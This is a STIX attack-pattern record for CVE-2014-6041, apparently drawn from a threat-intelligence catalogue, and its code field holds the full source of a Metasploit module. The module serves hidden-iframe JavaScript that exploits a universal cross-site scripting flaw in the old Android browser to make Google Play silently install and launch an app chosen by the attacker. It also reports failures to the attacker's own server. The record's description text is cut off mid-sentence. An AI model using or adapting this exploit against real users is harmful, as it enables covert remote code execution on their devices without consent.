{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--48dc2750-975b-479c-8390-34f88b4dbc7b",
    "created": "2024-08-14T16:22:42.899924Z",
    "modified": "2024-08-14T16:22:42.899929Z",
    "name": "Android Browser RCE Through Google Play Store XFO",
    "description": " This module combines two vulnerabilities to achieve remote code execution on affected Android devices. First, the module exploits",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/android/google_play_store_uxss_xframe_rce.rb",
            "external_id": "google_play_store_uxss_xframe_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2014/09/15/major-android-bug-is-a-privacy-disaster-cve-2014-6041/"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20150316151817/http://1337day.com/exploit/description/22581"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6041"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Android Browser RCE Through Google Play Store XFO',\n      'Description'    => %q{\n        This module combines two vulnerabilities to achieve remote code\n        execution on affected Android devices. First, the module exploits\n        CVE-2014-6041, a Universal Cross-Site Scripting (UXSS) vulnerability present in\n        versions of Android's open source stock browser (the AOSP Browser) prior to\n        4.4. Second, the Google Play store's web interface fails to enforce a\n        X-Frame-Options: DENY header (XFO) on some error pages, and therefore, can be\n        targeted for script injection. As a result, this leads to remote code execution\n        through Google Play's remote installation feature, as any application available\n        on the Google Play store can be installed and launched on the user's device.\n\n        This module requires that the user is logged into Google with a vulnerable browser.\n\n        To list the activities in an APK, you can use `aapt dump badging /path/to/app.apk`.\n      },\n      'Author'         => [\n        'Rafay Baloch', # Original UXSS vulnerability\n        'joev'          # Play Store vector and Metasploit module\n      ],\n      'License'        => MSF_LICENSE,\n      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],\n      'PassiveActions' => [ 'WebServer' ],\n      'References' => [\n        [ 'URL', 'https://www.rapid7.com/blog/post/2014/09/15/major-android-bug-is-a-privacy-disaster-cve-2014-6041/'],\n        [ 'URL', 'https://web.archive.org/web/20150316151817/http://1337day.com/exploit/description/22581' ],\n        [ 'OSVDB', '110664' ],\n        [ 'CVE', '2014-6041' ]\n      ],\n      'DefaultAction'  => 'WebServer'\n    ))\n\n    register_options([\n      OptString.new('PACKAGE_NAME', [\n        true,\n        'The package name of the app on the Google Play store you want to install',\n        'com.swlkr.rickrolld'\n      ]),\n      OptString.new('ACTIVITY_NAME', [\n        true,\n        'The name of the activity in the apk to launch',\n        'com.swlkr.rickrolld/.RickRoll'\n      ]),\n      OptBool.new('DETECT_LOGIN', [\n        true, \"Prevents the exploit from running if the user is not logged into Google\", true\n      ]),\n      OptBool.new('HIDE_IFRAME', [\n        true, \"Hide the exploit iframe from the user\", true\n      ])\n    ])\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Request '#{request.method} #{request.uri}'\")\n\n    if request.method.downcase == 'post'\n      print_error request.body[0..400]\n      send_response_html(cli, '')\n    else\n      print_status(\"Sending initial HTML ...\")\n      send_response_html(cli, exploit_html)\n    end\n  end\n\n  def exploit_html\n    <<-EOS\n      <html>\n      <body>\n      <script>\n\n      var APP_ID = '#{datastore['PACKAGE_NAME']}';\n      var MAIN_ACTIVITY = '#{datastore['ACTIVITY_NAME']}';\n      var HIDDEN_STYLE = '#{hidden_css}';\n\n      function exploit() {\n\n        var src = 'https://play.google.com/store/apps/'+(new Array(2000)).join('aaaaaaa');\n        var frame = document.createElement('iframe');\n        frame.setAttribute('src', src);\n        frame.setAttribute('name', 'f');\n        frame.setAttribute('style', HIDDEN_STYLE);\n        function uxss(src) {\n          window.open('\\\\u0000javascript:eval(atob(\"'+ btoa(src) +'\"))', 'f');\n        }\n\n        var loaded = false;\n        frame.onload = function() {\n          if (loaded) return;\n          loaded = true;\n          setTimeout(function(){\n            uxss('history.replaceState({},{},\"/\"); x=new XMLHttpRequest;x.open(\"GET\", \"/store/apps/details?id='+APP_ID+'\");x.onreadystatechange=function(){'+\n              'if(x.readyState==4){ document.open(\"text/html\"); document.write(x.responseText); document.close(); top.postMessage(\"1\", \"*\") }};x.send();');\n          }, 100);\n        };\n\n        var i1, i2;\n        var w = window;\n        window.onmessage = function(event) {\n          if (event.data === '1') {\n            i1 = w.setInterval(function(){\n              uxss('document.body.innerHTML.match(/This app is compatible/).length; document.querySelector(\"button.price\").click(); top.postMessage(\"2\", \"*\");');\n            }, 500);\n          } else if (event.data === '2') {\n            w.clearInterval(i1);\n            i2 = setInterval(function(){2\n              uxss('document.querySelector(\"button.play-button.apps.loonie-ok-button\").click(); top.postMessage(\"3\", \"*\");');\n              }, 500);\n          } else if (event.data === '3') {\n            clearInterval(i2);\n            setTimeout(function(){\n              setInterval(function(){\n                frame.src = 'intent:launch#Intent;SEL;component='+MAIN_ACTIVITY+';end';\n              }, 500);\n            }, 1000);\n          }\n        }\n\n        document.body.appendChild(frame);\n      }\n\n      #{detect_login_js}\n\n      </script>\n\n      </body>\n      </html>\n    EOS\n  end\n\n  def detect_login_js\n    if datastore['DETECT_LOGIN']\n      %Q|\n        var img = document.createElement('img');\n        img.onload = exploit;\n        img.onerror = function() {\n          var url = '#{backend_url}';\n          var x = new XMLHttpRequest();\n          x.open('POST', url);\n          x.send('Exploit failed: user is not logged into google.com')\n        };\n        img.setAttribute('style', HIDDEN_STYLE);\n        var rand = '&d=#{Rex::Text.rand_text_alphanumeric(rand(12)+5)}';\n        img.setAttribute('src', 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Fintl%2Fen%2Fimages%2Flogos%2Faccounts_logo.png'+rand);\n        document.body.appendChild(img);\n      |\n    else\n      'exploit();'\n    end\n  end\n\n  def hidden_css\n    if datastore['HIDE_IFRAME']\n      'position:absolute;left:-9999px;top:-9999px;height:1px;width:1px;visibility:hidden;'\n    else\n      ''\n    end\n  end\n\n  def backend_url\n    proto = (datastore[\"SSL\"] ? \"https\" : \"http\")\n    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']\n    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : \":#{datastore['SRVPORT']}\"\n    \"#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH']}/catch\"\n  end\n\n  def run\n    exploit\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}